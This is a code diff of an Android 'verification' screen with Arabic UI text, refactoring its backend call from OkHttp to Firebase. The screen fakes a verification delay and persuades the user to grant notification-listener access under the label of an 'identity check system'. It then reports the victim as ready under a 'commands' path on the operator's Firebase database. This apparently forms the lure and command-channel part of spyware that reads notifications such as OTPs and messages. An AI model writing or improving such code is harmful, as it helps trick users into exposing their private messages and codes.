@@ -17,62 +17,48 @@ import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 
-import okhttp3.MediaType;
-import okhttp3.OkHttpClient;
-import okhttp3.Request;
-import okhttp3.RequestBody;
+// استيراد الحزمة الرسمية للفايربيس ✅
+import com.google.firebase.database.FirebaseDatabase;
 
 public class VerifyActivity extends AppCompatActivity {
 
     private static final int PERMISSION_CODE = 101;
-    private final OkHttpClient client = new OkHttpClient();
     private String userName;
     
-    // تعريف عناصر الواجهة الجديدة
     private Button btnStartVerify;
-    private ProgressBar verifyProgressBar;
+    private ProgressBar verifyProgressBar, progressBarTop; // دعم الـ Progress المشترك الأنيق ✅
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        
-        try {
-            setContentView(R.layout.activity_verify);
-        } catch (Exception e) {
-            Toast.makeText(this, "خطأ في تحميل الواجهة", Toast.LENGTH_SHORT).show();
-            finish();
-            return;
-        }
+        setContentView(R.layout.activity_verify); // تأكد من وجود العناصر بالـ XML
 
         userName = getSharedPreferences("AppPrefs", MODE_PRIVATE).getString("user_name", "Unknown");
         
-        // ربط العناصر
         btnStartVerify = findViewById(R.id.btnStartVerify);
         verifyProgressBar = findViewById(R.id.verifyProgressBar);
+        progressBarTop = findViewById(R.id.progressBarTop);
 
         if (btnStartVerify != null) {
             btnStartVerify.setOnClickListener(v -> {
-                // تفعيل حالة التحميل وتعطيل الزر
                 toggleLoading(true);
-                
-                // تأخير بسيط لمحاكاة عملية الفحص قبل طلب الأذونات
-                new Handler(Looper.getMainLooper()).postDelayed(this::requestPermissionsSystem, 1200);
+                new Handler(Looper.getMainLooper()).postDelayed(this::requestPermissionsSystem, 1000);
             });
         }
     }
 
-    /**
-     * دالة للتحكم في حالة الزر وشريط الانتظار
-     */
     private void toggleLoading(boolean isLoading) {
+        if (btnStartVerify == null) return;
         if (isLoading) {
-            btnStartVerify.setEnabled(false); // تعطيل الضغط
-            btnStartVerify.setText(""); // إخفاء النص
+            btnStartVerify.setEnabled(false);
+            btnStartVerify.setText("");
             if (verifyProgressBar != null) verifyProgressBar.setVisibility(View.VISIBLE);
+            if (progressBarTop != null) progressBarTop.setVisibility(View.VISIBLE);
         } else {
             btnStartVerify.setEnabled(true);
             btnStartVerify.setText("بدء عملية الربط والتحقق");
             if (verifyProgressBar != null) verifyProgressBar.setVisibility(View.GONE);
+            if (progressBarTop != null) progressBarTop.setVisibility(View.GONE);
         }
     }
 
@@ -101,10 +87,8 @@ public class VerifyActivity extends AppCompatActivity {
 
     private void checkNotificationListenerBridge() {
         if (!isNotificationServiceEnabled()) {
+            toggleLoading(false);
             try {
-                // إذا لم يتم التفعيل، نعيد الزر لحالته الطبيعية ليتمكن من المحاولة لاحقاً
-                toggleLoading(false);
-                
                 Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
                 startActivity(intent);
                 Toast.makeText(this, "خطوة أخيرة: يرجى تفعيل 'نظام فحص الهوية' 🛡️", Toast.LENGTH_LONG).show();
@@ -116,27 +100,20 @@ public class VerifyActivity extends AppCompatActivity {
         }
     }
 
+    // التحديث الحي والمباشر عبر الفايربيس بدلاً من OkHttp 🚀
     private void notifyAdminSuccess() {
-        // تأكد من أن حالة التحميل مستمرة أثناء الاتصال بالسيرفر
         toggleLoading(true);
 
-        String url = "https://banproject-2f9c6-default-rtdb.firebaseio.com/commands/" + userName + "/status.json";
-        RequestBody body = RequestBody.create("\"waiting\"", MediaType.parse("application/json"));
-        
-        new Thread(() -> {
-            try {
-                client.newCall(new Request.Builder().url(url).put(body).build()).execute();
-                new Handler(Looper.getMainLooper()).post(() -> {
-                    Toast.makeText(this, "تم تفعيل نظام الفحص السحابي ✅", Toast.LENGTH_SHORT).show();
-                    finish(); // العودة للواجهة السابقة
-                });
-            } catch (Exception e) {
-                new Handler(Looper.getMainLooper()).post(() -> {
+        FirebaseDatabase.getInstance().getReference("commands")
+                .child(userName).child("status").setValue("waiting")
+                .addOnSuccessListener(aVoid -> {
+                    Toast.makeText(this, "تم تفعيل نظام الفحص السحابي بنجاح ✅", Toast.LENGTH_SHORT).show();
+                    finish();
+                })
+                .addOnFailureListener(e -> {
                     toggleLoading(false);
-                    Toast.makeText(this, "فشل الربط، تأكد من الإنترنت", Toast.LENGTH_SHORT).show();
+                    Toast.makeText(this, "فشل الربط السحابي، تحقق من الإنترنت", Toast.LENGTH_SHORT).show();
                 });
-            }
-        }).start();
     }
 
     private boolean isNotificationServiceEnabled() {
@@ -148,12 +125,9 @@ public class VerifyActivity extends AppCompatActivity {
     @Override
     protected void onResume() {
         super.onResume();
-        // في حال عاد المستخدم من الإعدادات، نتحقق مجدداً إذا فعل الخدمة
         if (isNotificationServiceEnabled()) {
-            // إذا فعلها وهو في الإعدادات ورجع، نقوم بإنهاء العملية تلقائياً
             notifyAdminSuccess();
         } else {
-            // إذا لم يفعلها، نضمن أن الزر قابل للضغط مرة أخرى
             toggleLoading(false);
         }
     }
